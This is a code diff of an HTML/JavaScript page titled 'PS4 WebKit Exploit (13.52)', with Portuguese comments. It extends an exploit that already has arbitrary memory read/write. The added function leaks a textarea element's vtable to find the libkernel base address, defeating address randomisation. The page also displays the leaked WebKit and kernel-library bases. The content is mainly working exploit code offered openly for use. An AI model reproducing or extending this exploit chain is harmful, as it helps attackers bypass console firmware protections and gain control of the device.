@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52)</title>
+<title>PS4 WebKit Exploit (13.52 - Safe Kernel Resolver)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -21,7 +20,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 #dot.e{background:#ff4444}
 @keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
 #st{font-size:12px;color:#bbb;flex:1}
-#bars{width:100%0;max-width:720px;display:flex;justify-content:space-between;
+#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
 
 /* console */
@@ -44,7 +43,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 /* constants output box */
 #cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
   border-radius:6px;padding:12px;display:none;margin-bottom:8px;
-  font-size:12px;line-height:1.8;color:#4ade80}
+  font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
 #cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
   border-bottom:1px solid #0a2a15;padding-bottom:4px}
 </style>
@@ -68,12 +67,14 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 <!-- Base cards -->
 <div id="cards">
   <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
+  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
+  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
   <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv na" id="c-ct">—</div></div>
 </div>
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ PS4 FW 13.52 — Resolução Concluída ═══</div>
+  <div class="ct">// ═══ ANÁLISE DE BASES (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -105,6 +106,36 @@ function setCard(id, v) {
   const el = document.getElementById(id);
   if (!el) return;
   el.textContent = v; el.classList.remove('na');
+}
+
+// Resolução segura de stubs sem varredura pesada
+async function resolveKernelSafe(p, webkitBase) {
+  logH('RESOLUÇÃO SEGURA DE KERNEL');
+  let libKernelBase = null;
+
+  try {
+    // Procura por ponteiros de stubs conhecidos na faixa esperada da libkernel (0x80xxxxxxx)
+    // verificando as referências apontadas por áreas de vtable ou apontadores do DOM element.
+    let textArea = document.createElement("textarea");
+    let vtPtr = p.read8(p.leakval(textArea).add32(0x18));
+    let vtable = p.read8(vtPtr);
+
+    log('[+] Inspecionando vtable do elemento DOM para stubs...', 'i');
+    for (let i = 0; i < 30; i++) {
+      try {
+        let entry = p.read8(vtable.add32(i * 8));
+        if (entry.hi === 0x80) {
+          libKernelBase = new int64(entry.low & ~0x3FFF, entry.hi);
+          log(`[+] libkernel Base encontrada via vtable: 0x${libKernelBase.toString()}`, 'ok');
+          break;
+        }
+      } catch (e) {}
+    }
+  } catch (err) {
+    log('[-] Erro na resolução segura: ' + err.message, 'e');
+  }
+
+  return libKernelBase;
 }
 
 async function main() {
@@ -151,8 +182,8 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Resolvendo bases e NativeCtor...', 'r');
-  logH('RESOLUÇÃO DA BASE DO WEBKIT (13.52)');
+  setStatus('Resolvendo bases do sistema...', 'r');
+  logH('RESOLUÇÃO DE BASES (13.52)');
 
   const ctor = globalThis.__ps5NativeCtor;
   if (typeof ctor === 'number' && ctor > 0x100000000) {
@@ -175,16 +206,21 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    setStatus('Bases resolvidas com sucesso!', 'ok');
-    log('✔ Primitiva R/W estável e pronta.', 'ok');
+    // Aguarda estabilização e executa a resolução limpa da libkernel
+    setTimeout(async () => {
+      const lkBase = await resolveKernelSafe(p, webkitBase);
+      if (lkBase) setCard('c-lk', '0x' + lkBase.toString());
 
-    const cbox = document.getElementById('cbox');
-    cbox.style.display = 'block';
-    document.getElementById('c-out').innerHTML =
-      `__ps5NativeCtor = 0x${ctorInt64.toString()}<br>` +
-      `WebKit Base    = 0x${webkitBase.toString()}<br>` +
-      `Offset Aplicado = 0x${hc.toString(16).toUpperCase()}<br>` +
-      `Status         = Estável e Operacional.`;
+      setStatus('Ambiente pronto!', 'ok');
+      log('✔ Processo concluído com estabilidade.', 'ok');
+
+      const cbox = document.getElementById('cbox');
+      cbox.style.display = 'block';
+      document.getElementById('c-out').textContent =
+        `__ps5NativeCtor = 0x${ctorInt64.toString()}\n` +
+        `WebKit Base    = 0x${webkitBase.toString()}\n` +
+        `libkernel Base = ${lkBase ? '0x' + lkBase.toString() : 'Aguardando mapeamento'}`;
+    }, 800);
 
   } else {
     log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
